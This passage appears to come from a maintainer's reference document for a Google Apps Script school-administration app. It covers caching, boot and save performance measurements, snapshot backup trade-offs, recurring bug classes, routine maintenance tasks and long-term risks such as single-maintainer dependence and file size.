| CacheService (server, shared) | `_getRealStats_`, `getLiveReportData`, `getRecruitmentContext`, `getInterviewResults`, `getPlacementResults` (5 min); `_enrolmentByIntakeMonth` (30 min) |
| Version-stamped keys | Cache keys embed a stamp; the student sync bumps it, invalidating everything student-derived at once. `_cacheVersion_()` is memoised per execution, and `_bustStudentCache_` clears that memo |
| Request batching | `getRecruitmentBundle` returns grid data, vocabularies, previous-year figures and the note in one call. `getBootBundle` does the same for the entire login path |
| Sheets advanced service | `_recruitBatchValues_` reads all six 募集 tabs in ONE `batchGet`; `_bulkReadSheets_` does the same for the student/config/schedule/dorm tabs. Both fall back to per-sheet `getDataRange()` if the service is unavailable, so a missing scope costs speed and never correctness |
| Per-execution memo | `_readTabs_` fetches a tab at most once per request; `_forgetTab_` drops one after a write so a later read in the same execution sees it |
| Client-side caches | Booking option lists; theme in localStorage; the whole teacher schedule (week navigation is client-side) |
| Optimistic writes | 留学ビザ以外 and キャンセル adds and deletes apply locally and render at once, then tell the server — the only way to beat the ~1s floor |
| Deferred loads | 修了・卒業生 (`getDashboardData(role, true)` on first sub-tab visit); the XLSX library (`_withXlsx`, on first export) |

### 8.1 The boot path

Login used to cost **four calls in two serial waves**: `resumeSession` alone,
then `getDashboardData` + notifications + announcements fired concurrently.
Concurrent calls contend and inflate each other, so this was far worse than four
times a cheap call.

`getBootBundle(token)` returns user + dashboard + notifications + announcements
in one call, and `loginUser` returns the same `boot` key so a fresh PIN login
gets one round trip too. `_bootPayload_` primes `_readTabs_` with everything the
user is entitled to, so all three producers share a **single** `batchGet`.

Measured: 537 + 345 + 296 = **1178ms of server work → 327ms**, in one call
instead of four. It is faster than `getDashboardData` alone used to be.

The call is fired from the **pre-paint script block**, not `DOMContentLoaded`, so
the ~1s round trip overlaps the remaining ~500KB of parse. It is strictly an
accelerator: `google.script.run` is injected by the sandbox and may not exist
that early, so a missing API falls through to the old path.

⚠️ **Every consumer of `boot` must fall back to fetching it the old way.**
`_bootPayload_` try/catches each producer individually, so any piece may be
absent. A failing announcement read must never cost someone their login. This
also covers a real divergence: the backend's `_hasPerm_` does not expand a literal
`permissions === "ALL"`, while the front-end's `hasPermission()` does — such a
user simply gets the fallback path.

### 8.1.1 Production baseline (2026-08-07, `@232`)

Medians of three samples, production. Sheet sizes at the time: Central_DB 607,
Past_DB 1449, Schedule_DB 434, Interview_Results 442, Room_Info 336.

| Producer | median ms | payload bytes | |
|---|---|---|---|
| `_bootPayload_` (replaces 4 calls) | **305** | **157,664** | the login path |
| `getDashboardData` (no past) | 312 | 157,612 | ≈ all of the boot payload |
| `getDashboardData` (+past) | 419 | 459,874 | 2.9× the payload — deferred, see §8.2 |
| `getDormData` | 279 | 173,593 | |
| `getAllTeachersSchedule` (all) | 207 | 116,048 | |
| `getAllTeachersSchedule` (1 week) | 222 | 15,811 | **slower** than fetching everything |
| `getRecruitmentBundle` | 242 | 3,943 | |
| `getInterviewResults` | 31 | 49,302 | `_cached_` — 380ms cold |
| `getLiveReportData` | 24 | 4,524 | `_cached_` — 410ms cold |
| `getPendingNotifications` | 245 | — | |
| `getAnnouncements` | 180 | — | |
| `_snapshotSheet_(Schedule_DB)` | 5,235 | — | single sample, see below |

Three things this baseline establishes:

- **Boot is at parity with the 327ms recorded in §8.1**, on an unchanged ~158KB
  payload, after the 進路, ホーム, 修了・卒業生進路 and roles work all landed. None
  of it cost anything on the login path.
- **The cache is worth 12–17×** on the two producers that have one, and only
  those two move: 380→28ms and 410→23ms across the three samples.
- **One week of schedule costs more than all of it** (222ms/15KB vs 207ms/116KB).
  The client fetching the whole schedule so week navigation needs no round trip is
  the right call, and this is the measurement that says so.

⚠️ `_snapshotSheet_` is measured **once**, not three times — each call writes a real
backup into a rotation that keeps only `SNAPSHOT_KEEP` (10) per sheet, so
profiling it three times would discard three genuine Schedule_DB backups every
run. Which means it is also the one figure in this table that a single sample
cannot support: it read 3,060ms in an earlier profile and 3,144ms on staging the
same day. Treat it as "seconds, and the dominant save cost", not as 5,235.

### 8.2 Payload, not just latency

Dropping Past_DB from boot saved **no meaningful server time** (537ms vs 487ms —
noise). It cut the payload 408KB → 158KB. Distinguish the two: for
`getAllTeachersSchedule` and `getDashboardData` the win was bytes on the wire and
DOM build time, not sheet reads.

The calendar deliberately fetches **all** weeks (`getAllTeachersSchedule("")`)
and navigates client-side. One 101KB payload on entering the tab beats putting a
~1s round trip behind every arrow press. The per-week filter is kept because it
is the natural lever if Schedule_DB outgrows a single payload — it only ever
accumulates rows.

### 8.3 The save path

`saveScheduleBatch` ran ~2.7s of fixed cost before touching the actual change:

| | was | now |
|---|---|---|
| `_snapshotSheet_` | 1928ms, **every save** | throttled to once per `SNAPSHOT_THROTTLE_SEC` (10 min) |
| Schedule_DB read | 597ms (`getDataRange`) | ~280ms (`_readTabs_`) |
| `DriveApp.getFolderById` | 218ms, every save | only when an update carries a file |
| Cell writes | **14** separate `setValue` calls per update | 4 contiguous range writes |

⚠️ **Writes go in contiguous ranges, and the ranges stop short of columns 2–5 and
17–22 on purpose.** 2–5 are the lookup key; 17–22 are the `BookerReq_*` block
belonging to another workflow. Do not "simplify" this into one row-wide write.

`_snapshotSheetThrottled` is used **only** by `saveScheduleBatch`. Rare
destructive operations — row deletes, restores, migrations,
`requestBookerDateChange` and friends — still call `_snapshotSheet_` directly,
where a full copy per call is the right price.

The remaining ~1150ms is irreducible: `copyTo` across documents is 724ms and
`openById` on the external backup file is 215ms. The prune is 7ms, so optimising
it buys nothing. Deferring it to a `ScriptApp` trigger would zero it, but was
rejected: trigger quota, cleanup that must not leak, and a silent-failure mode
where backups quietly stop and nobody notices until they are needed.

⚠️ Throttling means most saves have **no pre-write snapshot**. The recoverable
state is whatever the 10-minute window started at. In exchange `SNAPSHOT_KEEP=10`
now spans ~100 minutes of history instead of however long ten clicks take —
before, ten toggles in one afternoon evicted every older backup.

⚠️ **`getLastYearCourseCounts` must not be cached per intake.** The scan is
identical for every intake; only the year/month picked out of it differs. A
per-intake key re-scanned Central_DB + Past_DB on every switch, costing seconds
each time. It now buckets the whole scan once under a single key
(`enrolByIntakeMonth`) and slices per intake.

⚠️ **A blank intake is resolved server-side.** `getRecruitmentData(..., resolveBlank)`
picks the newest intake and returns it as `resolvedIntake`. Previously the first
open fetched every intake's counts, discarded the payload, and re-fetched scoped
— two round trips where one does. §9.7 still applies to any other caller.

⚠️ **Rows carry `_sheetRow`, the spreadsheet row index.** Deleting row N shifts
every later row down by one. A full refetch used to hide that; the optimistic
paths renumber explicitly in `_recDropRow`. Get it wrong and the *next* delete
removes the wrong person. Deletes are blocked while an add is in flight, because
the server computes that add's row index before the delete lands.

⚠️ **Adds must hold a script lock.** `addOtherVisaRow` reads the highest 番号
then appends; without `LockService` two quick adds both read the same maximum and
assign it twice. `addCancelRow` locks too — concurrent appends otherwise report
the same `getLastRow()`, pointing two rows at one sheet row.

⚠️ **Cell edits must write back to the local model** (`_recApplyCellToModel`).
Now that edits no longer trigger a `recLoad()`, any re-render rebuilds the inputs
from `recData`, so anything not written back is silently wiped off the screen.
⚠️ **`_recQueueCapacity` is in this rule too, and was the bug found writing it.**
`recRenderCapacitySummary` runs on any 課程 change in 留学ビザ以外 / 不交付 /
キャンセル, so a 定員 typed but not written back vanished from the screen — and the
live re-read in `recSaveAll` then picked the *old* number back out of the freshly
rendered input and saved that.

⚠️ Permission checks must stay **outside** the cached producer — a cached value
must never let an unauthorised caller bypass its check. (Extracting a producer
once moved a role check inside a function that no longer received the role.)

Service workers and HTTP cache control are unavailable: GAS serves the app in a
sandboxed iframe on a domain you don't control. Application-level caching is the
only option.

---

## 9. Recurring Bug Classes

Each of these has caused real, hard-to-diagnose faults. They recur because they
fail **silently**.

### 9.1 Identity by name rather than ID
Buildings, courses and recruiters are matched by name string. This produced the
WestJapan alias problem, the か/カ miscount, and the inability to distinguish two
recruiters sharing a name. Compare through `_normName_` / `normName`; trim
building IDs on both sides. *The React rewrite fixes this structurally with real
foreign keys.*

### 9.2 Invisible characters
Full-width spaces (U+3000), trailing spaces and full-width ASCII have broken
sheet-tab lookups, placement results and staff matching. When a lookup finds
nothing that plainly exists, suspect character variance first.

### 9.3 Leading-zero coercion
`"0123"` loses its zero when written as a number. Set the cell format to text
**before** writing and write a String. Bulk `setValues` re-coerces, so
`_applyRoomInfoFormats_` runs before and after the dorm sync and after restores.

### 9.4 Array reference vs copy
Reading a constant's array and pushing to it mutates the constant for the
session — this made courses accumulate on every intake switch. Always `.slice()`
before modifying.

### 9.5 Temporal dead zone
A `let`/`const` read before its declaration throws. Functions that run during
page load must only reference variables declared above them. This broke the
student list once (`_expScope`).

### 9.6 Missing DOM elements
An unguarded `getElementById('x').style` on a removed element throws and takes
the whole render path down silently. After structural edits, verify every DOM
reference resolves.

### 9.7 Scope of a blank filter
A blank intake means "no filter" in `getRecruitmentData`, so the first load
returns every intake's data. The UI re-fetches once a concrete intake is chosen.

### 9.8 Platform limits
- 6-minute execution limit; daily quotas on email and Drive operations.
- GAS cannot merge PDFs — building documents stay separate downloads.
- Sheets grow slower over time; Central_DB is 530+ rows and rising.

---

## 10. Common Maintenance Tasks

| Task | How |
|---|---|
| Add a user | ユーザー管理 → form → tick permissions. The role alone grants nothing |
| Add a recruitment intake | 募集状況 → ＋入学期. Becomes available in bookings and interview results too |
| Change which courses run in a month | Edit `REC_COURSES_BY_MONTH` in `Index.html`. PlacementTest_Config extends but never replaces |
| Fix a dorm that won't auto-assign | Add a `Dorm_Aliases` row, then run 割当テスト |
| Delete a room / building | Room edit modal → 部屋を削除 (`edit_dorms`). Building edit modal → 建物を削除 (admin, cascades) |
| Recover a bad write | Data Safety → snapshot list → restore |
| Force fresh student figures | Run the student sync; it bumps the cache stamp automatically |
| Send an announcement | ユーザー管理 → お知らせ配信 (master only) |

Moving or renaming spreadsheet **files and Drive folders is safe** — everything
is referenced by ID. **Never rename a sheet tab or a column header.**

---

## 11. Long-Term Risks

- **Single maintainer.** This document is the mitigation. Keep it current — a
  stale reference is worse than none, because it will be trusted.
- **Staging exists now.** A second Apps Script project bound to a copy of the
  spreadsheet, pushed with `clasp -P .clasp-staging.json push`. A bare
  `clasp push` still goes to production, so the `-P` is what keeps them apart.
  The copy is a point-in-time snapshot and does not track production; it also
  holds real student records behind an `ANYONE_ANONYMOUS` URL, so treat its link
  as sensitive. Script Properties do not copy, so staging has its own (empty)
  backup file and sync config.
- **File size.** `Index.html` is 628KB / 10,838 lines and `Code.js` 8,400. Edits
  are increasingly risky; this is the strongest argument for the planned rewrite.
- **Name-based identity.** See §9.1. Resolved only by moving to real IDs.
- **Data-entry inconsistency.** Most faults originate in inconsistent source
  data. Every new comparison must use the normalisers.
- **External dependencies.** The backup store, placement result sheets, and
  Central_DB/Past_DB. Check the constants if any of these move.
- **Unused code.** The personal 面接スケジュール view was removed on 2026-08-07
  (`b6c207e`, `eea0702`) — 294 lines. It had been unreachable twice over: the tab
  handler redirected to `view-shared-schedule`, and its only button was hidden for
  every role.

  ⚠️ Worth remembering before the next such removal. Deleting the markup alone
  would have taken the app down for **every user of every role**:
  `setupInterfaceBasedOnRole` dereferenced `btnNotifToggle` — a button inside that
  view — unguarded in *both* branches of a role check, mid-function and before
  `switchMainTab(defaultTab)`. No tab would have rendered and nothing on screen
  would have said why. Dead markup is rarely dead on its own; something live
  reaches into it. `tests/domrefs.test.js` now catches this class outright.
